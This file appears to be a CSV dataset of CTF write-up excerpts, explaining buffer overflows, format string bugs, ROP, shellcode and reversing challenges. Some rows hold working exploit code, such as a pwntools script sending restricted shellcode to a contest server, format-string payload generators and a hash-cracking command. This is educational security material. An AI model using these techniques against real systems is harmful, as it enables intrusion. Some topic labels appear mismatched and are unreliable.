dataset,identifier,repo,relative_path,title,topic,excerpt
ctf_writeup,pwntools-write-ups-0,pwntools-write-ups,README.md,pwntools-write-ups,rop,"# pwntools-write-ups A collection of CTF write-ups all using pwntools ## Dependencies - libc++1 (2014/gits-teaser/citadel) - pwntools (master branch from github, and ofc. all dependencies for pwntools) ## Known Issues Some of the tests are a bit finnicky, both due to pwntools and the services themselves. - Some services cannot be re-run immediately (services without REUSEADDR) - Services that aren't working: - 2013/pctf/ropasaurus - 2014/defcon-quals/babyfirst-heap - 2014/defcon-quals/bbgp If other tests are failing or there are other issues (e.g. services still running after the test), then please file an issue."
ctf_writeup,pwntools-write-ups-1,pwntools-write-ups,wargames/overthewire-vortex/level12/README.md,level12,buffer_overflow,"# Vortex 12 This is the same challenge as Level 8, but with NX enabled. We leverage pwntools' `gdb.find_module_addresses(binary, ssh=shell)` to grab all of the addresses for the libraries, then use pwntools' `ROP` module to generate a ROP stack to load some shellcode. The shellcode then does the exact same thing as level 8. The interesting part for this challenge was where to put the ROP. The buffer overflow is `strcpy` and I didn't want to restrict the ROP in any way. It turns out that you can store arbitrary data in the `argv[]` array, so I put it there. I use GDB to do stack-hunting to find the absolute address of my `argv[]` to do the pivot. Again, I use hellman's `r.sh` so that stack addresses in GDB and not-GDB are connsitent."
ctf_writeup,pwntools-write-ups-2,pwntools-write-ups,wargames/overthewire-vortex/level4/README.md,level4,format_string,"# Vortex 4 `printf` format string vulnerability, combined with a bit of information about stack layout. `argc` can be zero if expressly created that way via an `exec` call. If `argv` is used to index the non-existed arguments, it can (in this case, does) index into the `envp` array. For the sake of ""because"", this also auto-discovers the offset of the arguments needed to pass to hellman's `libformatstr`. We use the format string to overwrite the GOT entry for `_exit`, and point it at our shellcode on the stack. The absolute address of the stack is leaked by a small helper program run on the target system."
ctf_writeup,pwntools-write-ups-3,pwntools-write-ups,wargames/overthewire-vortex/level3/README.md,level3,buffer_overflow,# Vortex 3 Simple buffer overflow that will write a pointer to our buffer anywhere in the binary. We use this to overwrite the GOT entry for `_exit`.
ctf_writeup,pwntools-write-ups-4,pwntools-write-ups,wargames/overthewire-vortex/level13/README.md,level13,format_string,"# Vortex 13 Format string fun for a multiple GOT overwrite. It also nulls out the args and environment. For whatever reason, libc puts a copy of `basename(argv[0])` on the stack, so we store our pointers there."
ctf_writeup,pwntools-write-ups-5,pwntools-write-ups,wargames/overthewire-vortex/level2/README.md,level2,other,# Vortex 2 Simple permissions issue with annoying filenames. Setuid binary will tar up any file you give it into `'/tmp/ownership.$$.tar'`.
ctf_writeup,pwntools-write-ups-6,pwntools-write-ups,wargames/overthewire-vortex/level5/README.md,level5,other,# Vortex5 Hash cracking exercise. Probably the fastest way to do this is with oclHashcat. ``` cudaHashcat64.exe -a3 155fb95d04287b757c996d77b5ea51f7 ?a?a?a?a?a ```
ctf_writeup,pwntools-write-ups-7,pwntools-write-ups,wargames/overthewire-vortex/level9/README.md,level9,other,"# Vortex 9 So you're supposed to just search around a bit. There aren't any interesting setuid binaries. Most of the files don't stand out. However, ones stands alone and doesn't have 20 others like it. ``` $ find . 2>/dev/null | grep vort ... ./var/mail/vortex9 ... $ cat ./var/mail/vortex9 5WT0}swdc ``` Tada."
ctf_writeup,pwntools-write-ups-8,pwntools-write-ups,wargames/overthewire-vortex/level7/README.md,level7,buffer_overflow,"# Vortex 7 If you can satisfy a CRC requirement, you get stack buffer overflow. Stack is executable, so we just replace the return address with a pointer to our buffer. Uses hellman's excellent `r.sh` to make the stack layout consistent between normal execution, `gdb`, `strace`, etc. ``` int main(int argc, char **argv) { char buf[58]; u_int32_t hi; if((hi = crc32(0, argv[1], strlen(argv[1]))) == 0xe1ca95ee) { strcpy(buf, argv[1]); } else { printf(""0x%08x\n"", hi); } } ```"
ctf_writeup,pwntools-write-ups-9,pwntools-write-ups,wargames/overthewire-vortex/level11/README.md,level11,command_injection,"# Vortex 11 Simple heap corruption vulnerability. If you spam data at it, you'll see that you get a write-what-where. We nuke the GOT entry for `_exit` with a pointer to our shellcode in the heap buffer, which is at a predictable address."
ctf_writeup,pwntools-write-ups-10,pwntools-write-ups,wargames/overthewire-vortex/level6/README.md,level6,command_injection,"# Vortex 6 Program re-executes itself if there are any environment variables. The definition of 'itself' is controlled via `argv[0]` which we control, and point at `/bin/sh`."
ctf_writeup,pwntools-write-ups-11,pwntools-write-ups,wargames/overthewire-vortex/level1/README.md,level1,format_string,"# Vortex 1 Simple buffer underflow. Decrement 'ptr' until it points at itself, overwrite the high byte. ```c int main ( ) { unsigned char buf[512]; unsigned char *ptr = buf + (sizeof(buf) / 2); unsigned int x; while ((x = getchar()) != EOF) { switch (x) { case '\n': print(buf, sizeof(buf)); continue; break; case '\\': ptr--; break; default: if (((unsigned int)ptr & 0xff000000) == 0xca000000) { setresuid(geteuid(), geteuid(), geteuid()); execlp(""/bin/sh"", ""sh"", ""-i"", NULL); } if (ptr > buf + sizeof(buf)) { continue; } ptr++[0] = x; break; } } printf(""All done\n""); } ```"
ctf_writeup,pwntools-write-ups-12,pwntools-write-ups,wargames/overthewire-vortex/level8/README.md,level8,buffer_overflow,"# Vortex 8 Turns out `setresuid` and company are thread-specific. This challenge exercises that. The unprivileged thread is vulnerable to a stack-buffer overflow. We leverage this to swap out the GOT entry for `_sleep` with a pointer to our shellcode, then call `_exit`. When the second thread attempts to sleep next, it executes the second stage. Yet again, this script uses hellman's excellent `r.sh` so that we can just script GDB to print out stack addresses for us and automate."
ctf_writeup,pwntools-write-ups-13,pwntools-write-ups,wargames/overthewire-vortex/level10/README.md,level10,command_injection,"# Vortex 10 This challenge requires pressing the F5 buttin in IDA pro, some brute forcing. The challenge gathers a bunch of timing information, feeds it to `srand()` and then `rand()`, and you need to predict a value. We use a helper C program with the logic lifted from Hex Rays to generate an approximation of the starting parameters, then duplicate the logic and search from Python. We load `libc` since I don't trust that Python's `rand`/`srand` are the same. Once we've found a match, we get a shell."
ctf_writeup,pwntools-write-ups-14,pwntools-write-ups,wargames/overthewire-vortex/level4/libformatstr/README.md,libformatstr,format_string,"libformatstr.py ==================== Small script to simplify format string exploitation. Usage --------------------- * Case 1 - replace one dword: ```python import sys from libformatstr import FormatStr addr = 0x08049580 system_addr = 0x080489a3 p = FormatStr() p[addr] = system_addr # buf is 14th argument, 4 bytes are already printed sys.stdout.write( p.payload(14, start_len=4) ) ``` * Case 2 - put ROP code somewhere: ```python import sys from libformatstr import FormatStr addr = 0x08049580 rop = [0x080487af, 0x0804873c, 0x080488de] p = FormatStr() p[addr] = rop sys.stdout.write( p.payload(14) ) ``` * Case 3 - guess argument number and padding: ```python import sys from libformatstr import FormatStr # let's say we have do_fmt function, # which gives us only output of format string # (you can also just copy fmtstr and output manually) buf_size = 250 # fix buf_size to avoid offset variation res = do_fmt(make_pattern(buf_size)) argnum, padding = guess_argnum(res, buf_size) # of course you can use it in payload generation p = FormatStr(buf_size) p[0xbffffe70] = ""\x70\xfe\xff\xbf\xeb\xfe"" # yes, you can also put strings sys.stdout.write( p.payload(argnum, padding, 3) ) # we know 3 byte"
ctf_writeup,pwntools-write-ups-15,pwntools-write-ups,2014/defcon-finals/wdub-v1/README.md,wdub-v1,command_injection,"# wdub wdub1 is static compiled ARMv7 binary. For some reason, IDA won't disassemble the binary correctly. We have to manually override the CPU architecture setting to ARMv7-M, then again, manually disassemble the instruction in Thumb mode with IDA's `MakeCode` functionality. ![](images/image10.png) The real main routine is at 0x9210 ![](images/image07.png) Strace tells us that wdub1 sets ALARM timer, also it can't be run from terminal (Socket operation on non-socket). ![](images/image11.png) So what we need to do in order to debug this binary is: 1. Disable alarm 2. Redirect I/O to socket. But the binary is static compiled and stripped. so it is difficult to disable alarm by patching. so we use signal masking to disable SIGALRM. ```c #include <stdio.h> #include <signal.h> int main(){ sigset_t signal_set; sigaddset(&signal_set, SIGALRM); sigprocmask(SIG_BLOCK, &signal_set, NULL); char* args[] = {""./wdub"", 0}; execve(args[0], args, 0); return 0; } ``` After disable the alarm and redirect the I/O with xinet.d, we can run the binary and debug it. ![](images/image03.png) At 0xc3b2 ~ 0xc3c2 the HTTP request object (12byte) is created. ![](images/image14.png) HTTP request object is consi"
ctf_writeup,pwntools-write-ups-16,pwntools-write-ups,2014/defcon-finals/eliza-x86-printf/README.md,eliza-x86-printf,buffer_overflow,"# Eliza This is the x86 version of the challenge. There are two vulnerabilities leveraged in this exploit. First, there's uninitialized stack data printed when doing the 'info' command. By calling 'help', you can pre-load that area with a pointer into the loaded module. ASLR is now defeated. Second, there's a buffer overflow in the implementation of `my_printf`. However, your buffer is effectively terminated by newlines or `NUL`s. In order to get around this, we need to pivot. The pivot is performed by loading a pointer to the `.data` area into `eax` (by means of `pop ecx` then `mov eax, ecx` gadgets). Afterward, we go into the `get_command_line` routine, which reads the second stage into the `.data` area with a known base address. Finally, we open the flag file and read it. Because the binary is RELRO (or some other reason, perhaps) we have to load `ebx` with the address of the `.got.plt` area before making calls. ## Caveats Because of file descriptor inheriting, the exploit may not work on your system unless you change the file descriptor for the `read` call. `5` works in `python`, `3` works in iPython. Additionally, this relies on pwntools auto-generation of some ROP stubs. Beca"
ctf_writeup,pwntools-write-ups-17,pwntools-write-ups,2013/codegate-quals/vuln100/README.md,vuln100,buffer_overflow,"# Codegate 2013 Vuln 100 Writeup ## Initial Investigation Simple forking server listens on port 6666. $ checksec.sh --file ./94dd6790cbf7ebfc5b28cc289c480e5e RELRO STACK CANARY NX PIE RPATH RUNPATH FILE Partial RELRO No canary found NX disabled No PIE No RPATH No RUNPATH ./94dd6790cbf7ebfc5b28cc289c480e5e After answering some trivia, it asks for your name. $ nc localhost 6666 Welcome to CODEGATE2013. This is quiz game. Solve the quiz. It is Foot Ball Club. This Club is an English Primier league football club. This Club founded 1886. This club Manager Arsene Wenger. This club Stadium is Emirates Stadium. What is this club? (only small letter) arsenal good!1 It is a royal palace locate in northern Seoul, South Korea. First constructed in 1395, laster burned and abandoned for almost three centuries, and then reconstructed in 1867, it was the main and largest place of the Five Grand Palaces built by the joseon Dynasty. What is it?(only small letter) gyeongbokgung good!2 He is South Korean singer, songwriter, rapper, dancer and record producer. He is known domestically for his humorous videos and stage performances, and internationally for his hit single Gangnam Style. Who is he?(only s"
ctf_writeup,pwntools-write-ups-18,pwntools-write-ups,2013/codegate-quals/vuln200/README.md,vuln200,buffer_overflow,"# Codegate 2013 Vuln 200 Writeup ## Initial Analysis It's a 32-bit binary with no mitigations. $ file ./94dd6790cbf7ebfc5b28cc289c480e5e ./94dd6790cbf7ebfc5b28cc289c480e5e: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xce5456409e1bfe207cd58c5b77ce99125d3b8d0f, stripped $ checksec.sh --file 94dd6790cbf7ebfc5b28cc289c480e5e RELRO STACK CANARY NX PIE RPATH RUNPATH FILE Partial RELRO No canary found NX disabled No PIE No RPATH No RUNPATH 94dd6790cbf7ebfc5b28cc289c480e5e Unfortunately, it doesn't appear to start out of the box: $ ./5b7420a5bcdc1da85bccc62dcea4c7b8 [2] + 11123 segmentation fault ./5b7420a5bcdc1da85bccc62dcea4c7b8 So let's dive into the disassembly. ## Disassembly & Reversing Right off the bat, we see that there's a simple ptrace anti-debugging check. This doesn't actually do anything. Ignore it. .text:08048ABE E8 AD FC FF FF call _ptrace .text:08048AC3 85 C0 test eax, eax .text:08048AC5 79 0C jns short loc_8048AD3 .text:08048AC7 C7 04 24 E6 9A+ mov dword ptr [esp], offset s ; ""Debugger Detected!!!"" .text:08048ACE E8 DD FD FF FF call _puts .text:08048AD3 After creating a listener socket, t"
ctf_writeup,pwntools-write-ups-19,pwntools-write-ups,2013/codegate-quals/vuln300/README.md,vuln300,buffer_overflow,"# Codegate 2013 Vuln 300 Writeup ## Initial Analysis The binary accepts data over stdin/stdout, and spits back at you a bunch of printable characters, appended with a number of your choosing. $ checksec.sh --file 8ff953dd97c4405234a04291dee39e0b RELRO STACK CANARY NX PIE RPATH RUNPATH FILE No RELRO No canary found NX disabled No PIE No RPATH No RUNPATH 8ff953dd97c4405234a04291dee39e0b $ file 8ff953dd97c4405234a04291dee39e0b 8ff953dd97c4405234a04291dee39e0b: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.18, BuildID[sha1]=0xe2aac24b3214869f3b7173a83dac8115ae4cd8ba, stripped Example output ./8ff953dd97c4405234a04291dee39e0b Input Num : 10 Input Msg : 10 Reply : ABCDEFGHIJ10 The immediate thing I'd think with this problem is to provide just-too-large values, and overwrite something with the data that's appended. Let's see if we can stick binary data on the end. python <<EOF | ./8ff953dd97c4405234a04291dee39e0b | xxd print 10 print '\xfb\n\x00' EOF 0000000: 496e 7075 7420 4e75 6d20 3a20 496e 7075 Input Num : Inpu 0000010: 7420 4d73 6720 3a20 5265 706c 7920 3a20 t Msg : Reply : 0000020: 0a41 4243 4445 4647 4849 4afb 0a0"
ctf_writeup,pwntools-write-ups-20,pwntools-write-ups,2013/codegate-quals/vuln400/README.md,vuln400,command_injection,"# Codegate 2013 Vuln 400 Writeup ## Initial Investigation Cool, we're actually getting to something with mitigations! checksec.sh --file 7b80d4d56c282a310297336752c589b7 RELRO STACK CANARY NX PIE RPATH RUNPATH FILE Partial RELRO Canary found NX enabled No PIE No RPATH No RUNPATH 7b80d4d56c282a310297336752c589b7 7b80d4d56c282a310297336752c589b7: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xff0014df6d9c8b3dfb72355bc23d76e370ac5687, stripped Let's see what it does... _______________________________ /==============================/ | Onetime Board Console | /------------------------------/ | | WELCOME | | |__________|_________|_________| | W a i t | ++++++++++++++++++++++++++++++++ And then we do wait. For thirty seconds. .text:08048A7B mov dword ptr [esp], 1Eh ; seconds .text:08048A82 call _sleep Let's get rid of that. Probably for throttling purposes during the CTF. python -c 'print ""\x90""*100' > nops dd conv=notrunc if=nops of=7b80d4d56c282a310297336752c589b7 seek=$((0xa82)) bs=1 count=5 Cool, what can we do? Looks like we can create/edit/delete/view replies with three fields. And then we can l"
ctf_writeup,pwntools-write-ups-21,pwntools-write-ups,2014/plaid/whee/writeup.txt,whee,other,"== WHEEE *UPDATE*: I was contacted Apocalyptic from w3stormz regarding an improvement to the attack. Scroll to the bottom for optimizations and benchmarks. In this challenge we will carry out a chosen plaintext attack on a block cipher in order to recover the round keys. We are given some python code which implement an encryption algorithm used by an online service. When connecting to the service we are asked for a typical SHA1 based proof-of-work. After submitting that we can send a (hex-encoded) string to encrypt, and after some time (the encryption algorithm is extremely slow to prevent offline brute force attacks) we get back the encrypted string (again hex-encoded). So let's look at the encryption algorithm; It is a block cipher running in ECB mode. Each block is 24 bits and is big-endian encoded. At a first glance the block cipher looks like a Feistel network with 2^24 rounds. Because of a (intentional?) typo it is not a Feistel network, but it is educational to analyse it as such, so for now let's ignore the typo. Because of a very weak key scheduling this cipher can be attacked. In the following we will denote the secret key to be uncovered by KEY, not to be confused with k"
ctf_writeup,writeups-0,writeups,README.md,writeups,other,"# writeups Writeups for CTFs by the team [ByteBandits](https://ctftime.org/team/13691) All writeups are organized in the pattern: ctf-name > problem-type > problem-name > author That is, very similar to that of the repo [writeups](https://github.com/ctfs/write-ups-2015) The repository also includes a small [search tool](search.py), through we can we can easily find writeups based on several conditions. Currently it just provides limited functionality and a crude command line interface."
ctf_writeup,writeups-1,writeups,hackvent-2015/README.md,hackvent-2015,format_string,# Hackvent 2015 ## by sudhackar This subdirectory contains some scripts I wrote for a particular day of the month for [hackvent 2015](http://hackvent.hacking-lab.com). Overall it was a great CTF. I ended up at #26 in 1000+ players. * 14 Dec : Simple .NET decompiling * 18 Dec : Mach-O 64-bit x86_64 executable * 19 Dec : Simple [SOAP](https://en.wikipedia.org/wiki/SOAP) * 23 Dec : Format String Exploitation
ctf_writeup,writeups-2,writeups,ectf-teaser-2015/reverse/BestShell/sudhackar/README.md,sudhackar,command_injection,"[](ctf=ectf-teaser-2015) [](type=reverse) [](tags=gdb,golang) [](tools=gdb) [](techniques=breakpoints) So what we have here is a [zip](../BestShell_d3bed024e5edcddeadade8a638247f5e.zip) file. On extracting it we get a single executable. ```bash $ file bestshell bestshell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=8b4c45947ca2795d92a94c560d91183710b4fea2, not stripped ``` A little bit of analysis shows us it was written in [Golang](https://github.com/golang). So I had to install Go as I had never used it before. Its brief output!! ```bash $ ./bestshell _ _ _ _ _ | |__ ___ ___| |_ ___| |__ ___| | | | '_ \ / _ \/ __| __/ __| '_ \ / _ \ | | | |_) | __/\__ \ |_\__ \ | | | __/ | | |_.__/ \___||___/\__|___/_| |_|\___|_|_| Available commands: 5azWRE, Ax7lIl, 312TUo, UgZInz >> 5azWRE total 84 -rwxr-x--x 1 sudhakar sudhakar 36632 Oct 8 21:46 bestshell -rw-r--r-- 1 sudhakar sudhakar 38191 Oct 10 10:22 bestshell.c -rw-r--r-- 1 sudhakar sudhakar 59 Oct 10 14:36 peda-session-bestshell.txt -rw-r--r-- 1 sudhakar sudhakar 1 Oct 10 12:56 peda-session-ls.txt >> Ax7lIl Tue Oct 13 19:16:55 IST 20"
ctf_writeup,writeups-3,writeups,watevr-2019/rev/repyc/vn-ki/README.md,vn-ki,command_injection,"# Repyc #### Category: Rev #### Points: 147 This was a python bytecode reversing challenge. We are given a python 3.6 bytecode compiled [file](./decomp.py). Once decompiled we get a python file with variables as unicode characters. ```python 佤 = 0 侰 = ~佤 * ~佤 俴 = 侰 + 侰 def 䯂(䵦): 굴 = 佤 굿 = 佤 괠 = [佤] * 俴 ** (俴 * 俴) 궓 = [佤] * 100 괣 = [] while 䵦[굴][佤] != '듃': 굸 = 䵦[굴][佤].lower() 亀 = 䵦[굴][侰:] if 굸 == '뉃': 괠[亀[佤]] = 괠[亀[侰]] + 괠[亀[俴]] elif 굸 == '렀': 괠[亀[佤]] = 괠[亀[侰]] ^ 괠[亀[俴]] elif 굸 == '렳': 괠[亀[佤]] = 괠[亀[侰]] - 괠[亀[俴]] elif 굸 == '냃': 괠[亀[佤]] = 괠[亀[侰]] * 괠[亀[俴]] elif 굸 == '뢯': 괠[亀[佤]] = 괠[亀[侰]] / 괠[亀[俴]] elif 굸 == '륇': 괠[亀[佤]] = 괠[亀[侰]] & 괠[亀[俴]] elif 굸 == '맳': 괠[亀[佤]] = 괠[亀[侰]] | 괠[亀[俴]] elif 굸 == '괡': 괠[亀[佤]] = 괠[亀[佤]] elif 굸 == '뫇': 괠[亀[佤]] = 괠[亀[侰]] ``` I thought this was some obfuscation technique and wasted some time looking for deobfuscators. Then I tried to rename the variables and try to make sense of the code. The function is later called with a list of lists. ```python ['꽺', 0, 0], ['꼖', 6, 'á×äÓâæíäàßåÉÛãåäÉÖÓÉäàÓÉÖÓåäÉÓÚÕæïèäßÙÚÉÛÓäàÙÔÉÓâæÉàÓÚÕÓÒÙæäàÉäàßåÉßåÉäàÓÉÚÓáÉ·Ôâ×ÚÕÓÔÉ³ÚÕæïèäßÙÚÉÅä×ÚÔ×æÔÉ×Úïá×ïåÉßÉÔÙÚäÉæÓ×ÜÜïÉà×âÓÉ×ÉÑÙÙÔÉâßÔÉÖãäÉßÉæÓ×ÜÜïÉÓÚÞÙïÉäàßåÉåÙÚÑÉßÉàÙèÓÉïÙãÉáßÜÜÉ"
ctf_writeup,writeups-4,writeups,watevr-2019/rev/hacking-for-vodka/vn-ki/README.md,vn-ki,other,"# Hacking for vodka #### Category: rev #### Points: 56 This was a relatively easy chall as you can see with the points. The following is the decompiled check. ```c while (i < n) { local_4c = pass[i]; // input byte local_4b = 0; local_4a = (byte)i ^ *(byte *)(enc + i); // flag byte local_49 = 0; (&uStack144)[uVar1 * 0x1ffffffffffffffe] = 0x555555554c1d; __n = strcmp(&local_4c,&local_4a,*(undefined *)(&uStack144 + uVar1 * 0x1ffffffffffffffe)); if (__n != 0) { (&uStack144)[uVar1 * 0x1ffffffffffffffe] = 0x555555554c2d; puts(""Sorry, incorrect password!"",*(undefined *)(&uStack144 + uVar1 * 0x1ffffffffffffffe)); /* WARNING: Subroutine does not return */ (&uStack144)[uVar1 * 0x1ffffffffffffffe] = 0x555555554c37; exit(0,*(undefined *)(&uStack144 + uVar1 * 0x1ffffffffffffffe)); } i = i + 1; } ``` Our input is checked byte by byte with the flag. (Also there is a ptrace check at the start, and this can be patched out) There are two easy methods I discovered after getting the flag using my method: * Bruteforce ltrace the flag out, figuring out the flag byte by byte. * Patch the incorrect password jump and provide an incorrect flag, thus getting the whole flag. I spoke with the chall author and "
ctf_writeup,writeups-5,writeups,watevr-2019/rev/funcknt/vn-ki/README.md,vn-ki,other,"# fuckn't #### Category: rev #### Points: 111 We are given a js file full of brackets. This is obfuscated using jsfuck obfuscator. So we use jsunfuck to get unfucked output. ```js [][""f""+([!1]+[][[[].filter[""constructor""](""return(isNaN+false).constructor.fromCharCode(119,97,116,101,118,114,123,106,97,118,97,115,99,114,105,112,116,95,105,115,95,97,95,49,97,110,103,117,97,103,51,95,102,48,114,95,105,110,116,51,49,49,51,99,116,117,97,49,115,125)"")()]])[""10""]+""lter""][""constructor""](""return alert"")()([].filter[""constructor""](""return(isNaN+false).constructor.""+420302320151902[""toString""](""31"")[""split""](3)[""join""](""C"")+""de(""+""73false39false109false32false115false111false114false114false121false32false68false97false118false101false44false32false73false39false109false32false97false102false114false97false105false100false32false73false32false99false97false110false39false116false32false100false111false32false116false104false97false116""[""split""](!1)+ "")"")()); ``` Even the unfucked output is not very readable. But we can see there are some numbers in the output. These numbers look ascii. Let's take a look. ```js >String.fromCharCode(119,97,116,101,118,114,123,106,97,118,97,115,99,114,105,112,116"
ctf_writeup,writeups-6,writeups,watevr-2019/misc/axela/vn-ki/README.md,vn-ki,other,"# Axela #### Category: misc #### Points: 236 Axela was an easy misc discord bot challenge but not a lot of teams solved it. The challenge was to exploit a discord bot called Axela. ``` $ Axela help All commands: Axela ping - ping Axela say <phrase> - repeats the phrase Axela get guilds <guild_id> - gets info about a specific guild Axela get channels <channel_id> - gets info about a specific channel Axela get users <user_id> gets info about a specific user ``` An interesting discovery: ``` $ Axela get users !@ Unrecognized response format {""user_id"": [""Value \""!@\"" is not snowflake.""]} ``` This means Axela will leak values if the format is not what it expects. Also searching for snowflake leads us to the discord api. ``` $ Axela get users / I dont like that character. Please don't use that. ``` Oh. They're filtering `/`. Now we know the exploit. URLEncode it. ``` $ Axela get users %2f 404: Not Found ``` As expected. Using discord api documentation, let's get the servers Axela is a part of: ``` $ Axela get users @me%2fguilds [{""id"": ""601776233411510302"", ""name"": ""Super Secret Server"", ""icon"": ""baca37e4b8e17d0d59afde06f86b4659"", ""owner"": false, ""permissions"": 2146959351, ""features"": ["
ctf_writeup,writeups-7,writeups,blaze-ctf-2018/re/magic-re/sudhackar/README.md,sudhackar,command_injection,"[](ctf=blaze-2018) [](type=re) [](tags=game) [](techniques=bruteforce) # magic-re (re-420) ``` One binary, two challenges - double the fun magic-re: Reverse me | magic-pwn: Pwn me Note: for magic-re, 4 flags can work, but only one makes sense and is the one to be submitted. Author : DuSu Solves : ~35 ``` This was an interesting chall, but due to a side channel it was easier to brute force this like the other RE chall. The input given was put into a code template and then executed byte by byte. The instructions allowed were ```python >>> from pwn import * >>> for i in xrange(0x40, 0x60): ... print i, disasm(chr(i)) ... 64 0: 40 inc eax 65 0: 41 inc ecx 66 0: 42 inc edx 67 0: 43 inc ebx 68 0: 44 inc esp 69 0: 45 inc ebp 70 0: 46 inc esi 71 0: 47 inc edi 72 0: 48 dec eax 73 0: 49 dec ecx 74 0: 4a dec edx 75 0: 4b dec ebx 76 0: 4c dec esp 77 0: 4d dec ebp 78 0: 4e dec esi 79 0: 4f dec edi 80 0: 50 push eax 81 0: 51 push ecx 82 0: 52 push edx 83 0: 53 push ebx 84 0: 54 push esp 85 0: 55 push ebp 86 0: 56 push esi 87 0: 57 push edi 88 0: 58 pop eax 89 0: 59 pop ecx 90 0: 5a pop edx 91 0: 5b pop ebx 92 0: 5c pop esp 93 0: 5d pop ebp 94 0: 5e pop esi 95 0: 5f pop edi ``` based on how we ma"
ctf_writeup,writeups-8,writeups,blaze-ctf-2018/re/smokemebaby/sudhackar/README.md,sudhackar,command_injection,"[](ctf=blaze-2018) [](type=re) [](tags=game) [](techniques=bruteforce) # smokemebaby (re-420) ``` get this files solve at: smokeme.420blaze.in tcp 12345 author: vito solves: ~30 ``` This was a rust compiled binary. In main()->check(), there were 39 check_i functions to verify the i'th character based on some equations. If the check failed check_i() returned i as the exit code. This made it perfect for bruteforce. Iterate through your keyspace unless the exit code increases, repeat. driver script ```python import subprocess import string prev = [""A"" for i in xrange(42)] #flag = ""on anntada ona? Somebnefbbeafd roia me a"" flag = """" for i, j in enumerate(flag): prev[i] = j for i in xrange(len(flag),42): cnt = [] for j in string.lowercase+string.digits+string.uppercase+"" <>,.?/\""\':;{}[]\\~`!@#$%^&*()_+=-"": prev[i] = j open(""input"", ""w+"").write("""".join(prev)) d = subprocess.Popen(""gdb -q -x ./plz.py "", shell=True, stdout=subprocess.PIPE).stdout.read().strip() try: c = int(d.split("":::::"")[1]) # print c, except: c = -1 cnt.append((c,j)) print cnt best = sorted(cnt ,key=lambda x: x[0], reverse=True)[0] prev[i] = best[1] print """".join(prev) """""" echo -ne ""on anntada ona? Somebnefbbeafd roia"
ctf_writeup,writeups-9,writeups,blaze-ctf-2018/pwn/shellcodeme_hard/sudhackar/README.md,sudhackar,command_injection,"[](ctf=blaze-2018) [](type=exploit) [](tags=game) [](techniques=shellcode) # shellcodeme_hard (pwn-420) ``` nc shellcodeme.420blaze.in 4200 Author : aweinstock ``` Solving the easy version of this chall took me some time. However once that was done, I used the same technique to pwn this one. In this hard version the stack and registers were populated from /dev/urandom so that we don't have references to pivot through. This made me do the chall in 6 unique bytes. ```python from pwn import * context(arch='amd64', os='linux', log_level='info') payload = asm((""push 0x40000000; ""*0x100)+(""push rbx; ""*36)+""push 0x400000; pop rbx; ""+(""inc ebx; ""*0x86d)+""push rbx; ret;"") payload2 = asm(shellcraft.amd64.linux.sh()) s = remote(""shellcodeme.420blaze.in"", 4200) s.sendline(payload) s.sendline(payload2) s.interactive() s.close() ``` The random values from the context seldom had 0s. So I sprayed the stack with a register to make `seen` for every character > 0. Then using the technique from [here](../../shellcodeme/sudhackar/README.md) to gain code execution."
ctf_writeup,writeups-10,writeups,blaze-ctf-2018/pwn/shellcodeme/sudhackar/README.md,sudhackar,command_injection,"[](ctf=blaze-2018) [](type=exploit) [](tags=game) [](techniques=shellcode) # shellcodeme (pwn-420) ``` Can you please smoke this? nc shellcodeme.420blaze.in 420 Author : aweinstock Solves : ~60 ``` This challenge had a hard version too. The way I exploited this chall worked in the hard one too. So 2 flags for the work of one. Source code was provided. ```c // gcc -zexecstack -Os shellcodeme.c -o shellcodeme #include <stdio.h> #include <string.h> #include <sys/mman.h> #include <unistd.h> #define BUF_SIZE (0x4096 & ~(getpagesize()-1)) int main() { setbuf(stdout, NULL); unsigned char seen[257], *p, *buf; void (*f)(void); memset(seen, 0, sizeof seen); buf = mmap(0, BUF_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); puts(""Shellcode?""); fgets(buf, BUF_SIZE, stdin); fflush(stdin); for(p=buf; *p != '\n'; p++) { seen[256] += !seen[*p]; seen[*p] |= 1; } if(seen[256] > 7) { puts(""Shellcode too diverse.""); _exit(1); } else { *(void**)(&f) = (void*)buf; f(); _exit(0); } } ``` 4 rwx pages are mmaped on which we can copy our input(0x4000). The only catch is the shellcode can't contain more than 7 unique bytes. ```c for(p=buf; *p != '\n'; p++) { seen[256] += !seen[*"
ctf_writeup,writeups-11,writeups,asis-ctf-quals-2017/pwn/fu-interpreter/sudhackar/README.md,sudhackar,format_string,"[](ctf=asis-ctf-quals-2017) [](type=exploit) [](tags=brainfuck) [](tools=pwntools) [](techniques=GOT overwrite) # Fu interpreter (pwn-101) We are given a [file](../fulang_e62955ff8cc20de534a29321b80fa246ddf9763f). ```bash $ file fulang_e62955ff8cc20de534a29321b80fa246ddf9763f fulang_e62955ff8cc20de534a29321b80fa246ddf9763f: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=746b0bdb7782ec102b56e6b27507d264920be051, not stripped $ checksec ./fulang_e62955ff8cc20de534a29321b80fa246ddf9763f [*] '/tmp/fulang_e62955ff8cc20de534a29321b80fa246ddf9763f' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE ``` The file is not stripped, so the decompilation is quite neat. There are only two functions of interest *main* and *fu_interpreter*. ```c int fu_interpreter(char a1, char a2) { _BYTE *v2; // ebx@13 char v3; // dl@15 signed int result; // eax@20 if ( a1 == ':' ) { if ( a2 == '<' ) --fu; if ( a2 == '>' ) ++fu; if ( a2 == '+' ) ++*(_BYTE *)fu; if ( a2 == '-' ) --*(_BYTE *)fu; if ( a2 == ':' ) putchar(*(_BYTE *)fu); if ( a2 == '.' ) { v2 = (_BYTE *)fu; *v2 = ge"
